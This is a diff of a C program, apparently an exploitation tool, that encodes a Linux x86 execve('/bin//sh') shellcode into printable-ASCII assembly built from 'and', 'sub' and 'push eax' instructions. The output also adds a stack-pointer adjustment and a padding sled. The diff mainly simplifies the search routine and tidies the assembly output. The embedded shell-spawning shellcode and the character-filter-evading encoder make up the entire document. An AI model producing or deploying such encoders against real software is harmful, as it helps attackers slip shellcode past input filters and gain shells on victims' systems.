@@ -37,27 +37,14 @@ unsigned char *getMIN(unsigned char *a, unsigned char *b, unsigned char *c){
 	return MIN;
 }
 
-struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsigned char RIGHT){
-	unsigned char LEFT_A = LEFT;
-	unsigned char RIGHT_A = RIGHT;
-	//unsigned char a = LEFT_A + (RIGHT_A - LEFT_A) / 2;
-	unsigned char a = LEFT_A;// + (RIGHT_A - LEFT_A) / 2;
-
-	unsigned char LEFT_B = LEFT;
-	unsigned char RIGHT_B = RIGHT;
-	//unsigned char b = LEFT_B + (RIGHT_B - LEFT_B) / 2;
-	unsigned char b = LEFT_B;// + (RIGHT_B - LEFT_B) / 2;
-
-	unsigned char LEFT_C = LEFT;
-	unsigned char RIGHT_C = RIGHT;
-	//unsigned char c = LEFT_C + (RIGHT_C - LEFT_C) / 2;
-	unsigned char c = LEFT_C;// + (RIGHT_C - LEFT_C) / 2;
+struct RESULT_BYTE * searchByte(unsigned char target, unsigned char start){
+	unsigned char a = start;
+	unsigned char b = start;
+	unsigned char c = start;
 
 	int counter = 0;
 
 	while(counter++ < 0xFF){
-		// printf("[TIMES] : [%x]\n", counter);
-		// printf("[%d] [%d] [%d]\n", a, b, c);
 		unsigned char temp = (a + b + c); // 计算和
 		unsigned char *pointer;
 				if (temp > target){
@@ -67,13 +54,11 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 					pointer = getMIN(&a, &b, &c);	
 					*pointer = *pointer + 1;
 				}else{
-					if (a < 0x20 || b < 0x20 || c < 0x20){
-						// 缠绕一圈
+					if (a < start || b < start || c < start){
 						a += 85;
 						b += 85;
 						c += 86;
 					}
-					
 					struct RESULT_BYTE * result = malloc(sizeof(struct RESULT_BYTE));
 					memset(result, 0, sizeof(struct RESULT_BYTE));
 					result->a = a;
@@ -81,14 +66,12 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 					result->c = c;
 					int temp = a + b + c;
 					result->overflow = temp / 0x100;
-					// printf("[FOUND] : 0x%2x + 0x%2x + 0x%2x [OVER] : %d\n", a, b, c, temp / 0x100);
-
 					return result;
 				}
 	}
 }
 
-struct RESULT * search(int target, char left, char right){
+struct RESULT * search(int target, char start){
 	
 	struct RESULT * result = malloc(sizeof(struct RESULT));
 	memset(result, 0, sizeof(struct RESULT));
@@ -99,129 +82,104 @@ struct RESULT * search(int target, char left, char right){
 	int overflow = 0;
 
 	struct RESULT_BYTE * result_byte = NULL;
-	// printf("-------------------------\n");
-	// printf("Searching : [%d] = [0x%x]\n", byte_l, byte_l);
-	result_byte = searchByte(byte_l, left, right);
+	/**/
+	result_byte = searchByte(byte_l, start);
 	result->result_a = result->result_a + result_byte->a;//
 	result->result_b = result->result_b + result_byte->b;//
 	result->result_c = result->result_c + result_byte->c;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-
-	// printf("-------------------------\n");
-	// printf("Searching : [%d] = [0x%x]\n", byte_ml, byte_ml);
-	result_byte = searchByte(byte_ml - overflow, left, right);
+	/**/
+	result_byte = searchByte(byte_ml - overflow, start);
 	result->result_a = result->result_a + result_byte->a * 0x100;//
 	result->result_b = result->result_b + result_byte->b * 0x100;//
 	result->result_c = result->result_c + result_byte->c * 0x100;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	// printf("-------------------------\n");
-	// printf("Searching : [%d] = [0x%x]\n", byte_mh, byte_mh);
-	result_byte = searchByte(byte_mh - overflow, left, right);
+	/**/
+	result_byte = searchByte(byte_mh - overflow, start);
 	result->result_a = result->result_a + result_byte->a * 0x10000;//
 	result->result_b = result->result_b + result_byte->b * 0x10000;//
 	result->result_c = result->result_c + result_byte->c * 0x10000;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	//printf("-------------------------\n");
-	//printf("Searching : [%d] = [0x%x]\n", byte_h, byte_h);
-	result_byte = searchByte(byte_h - overflow, left, right);
+	/**/
+	result_byte = searchByte(byte_h - overflow, start);
 	result->result_a = result->result_a + result_byte->a * 0x1000000;//
 	result->result_b = result->result_b + result_byte->b * 0x1000000;//
 	result->result_c = result->result_c + result_byte->c * 0x1000000;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	// printf("-------------------------\n");
 	return result;
 }
 
 void setZero(){
-	printf("and eax, 49494949H\n");
-	printf("and eax, 30303030H\n");
+	printf("\t\tand eax, 49494949H\n");
+	printf("\t\tand eax, 30303030H\n");
 }
 
 void printComment(int target){
-	printf(";========================\n");
-	printf(";  set eax = %x\n", target);
-	printf(";========================\n");
+	printf("\t\t;========================\n");
+	printf("\t\t;  set $eax=0x%x\n", target);
+	printf("\t\t;========================\n");
 }
 
-unsigned char * build(char * shellcode, char left, char right){
-	int length_shellcode = strlen(shellcode);
-	int length_malloc = (length_shellcode / 4 + 1 + 1) * 4;
-	char * pointer = malloc(length_malloc);
-	memset(pointer, 0x90, length_malloc);
+void printHeader(){
+	printf("global _start\n");
+	printf("\t_start:\n");
+}
+
+void printNOP(int times){
+	printf("\t\t;========================\n");
+	printf("\t\t;  push 0x90\n");
+	printf("\t\t;========================\n");
 	int i = 0;
-	/*
-	// shellcode : 
-	// 11 22 33 44 55 66 77
-	//   \  \  \  \  \  \  \
-	// 90 11 22 33 44 55 66 77
-*/
-	// strcpy
-	for (i = 0; i < length_shellcode; i++){
-		pointer[i] = shellcode[i];
+	for (i = 0; i < times; i++){
+		printf("\t\tpush eax\n");
 	}
+}
 
-	// target pointer to the last integer
-	int *target = ((int *)pointer) + ((length_malloc) / 4 - 1);
+void printAddESP(){
+	printf("\t\t;========================\n");
+	printf("\t\t;  add esp, ??? \n");
+	printf("\t\t;========================\n");
+	printf("\t\tpush esp\n");	
+	printf("\t\tpop eax\n");	
+	printf("\t\tsub eax, 55555442H\n");	
+	printf("\t\tsub eax, 55555442H\n");	
+	printf("\t\tsub eax, 55555442H\n");	
+	printf("\t\tpush eax\n");	
+	printf("\t\tpop esp\n");	
+}
 
-	for (i = 0; i < (length_malloc / 4); i++){
-		struct RESULT * result = search(0x100000000 - *target, left, right);
-		printComment(*target);
-		setZero();
-		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
-		printf("push eax\n");
-		free(result);
-	
-		target--;
-			
-	}
-	
-	/*
-	for(i = 0; i < length_shellcode; i++){
-		pointer[length_malloc - 1 - i] = shellcode[length_shellcode - 1 - i];
-	}
+unsigned char * build(char * shellcode, char start){
+		printHeader();
+		printAddESP();
 
-	int * target = (int *)pointer;
-	for (i = 0; i < (length_malloc / 4); i++){
-		struct RESULT * result = search(0x100000000 - *target, left, right);
-		printComment(*target);
-		setZero();
-		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
-		printf("push eax\n");
-		free(result);
-	
-			target++;
-	}
-	*/
-	/*
-
-	for(i = 0; i < length_shellcode; i++){
-		pointer[i] = shellcode[length_shellcode - i - 1];	
-	}
-	int *target = (int *)pointer;
-	for (i = 0; i < (length_malloc / 4); i++){
-	//	printf("target[%d] -> [%x]\n", i, *target);
-//		search(*target, 0x20, 0x7f);
-		struct RESULT * result = search(0x100000000 - *target, left, right);
-		printComment(*target);
-		setZero();
-		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
-		printf("push eax\n");
-		free(result);
-		target++;
-	}
-	*/
+		int length_shellcode = strlen(shellcode);
+		int length_malloc = (length_shellcode / 4 + 1 + 1) * 4;
+		char * pointer = malloc(length_malloc);
+		memset(pointer, 0x90, length_malloc);
+		int i = 0;
+		for (i = 0; i < length_shellcode; i++){
+				pointer[i] = shellcode[i];
+		}
+		int *target = ((int *)pointer) + ((length_malloc) / 4 - 1);
+		for (i = 0; i < (length_malloc / 4); i++){
+				struct RESULT * result = search(0x100000000 - *target, start);
+				printComment(*target);
+				setZero();
+				printf("\t\tsub eax, %xH\n\t\tsub eax, %xH\n\t\tsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
+				printf("\t\tpush eax\n");
+				free(result);
+				target--;
+		}
+		printNOP(32);
 }
 
 
 int main(){
-	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
-	build(shellcode, 0x20, 0x7f); // 设置参数似乎并没用
-	return 0;
+		char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
+		build(shellcode, 0x20); // 设置参数似乎并没用
+		return 0;
 }
-
-// 产生一个问题 :
-// C语言在计算立即数的时候的内存是怎么分配的
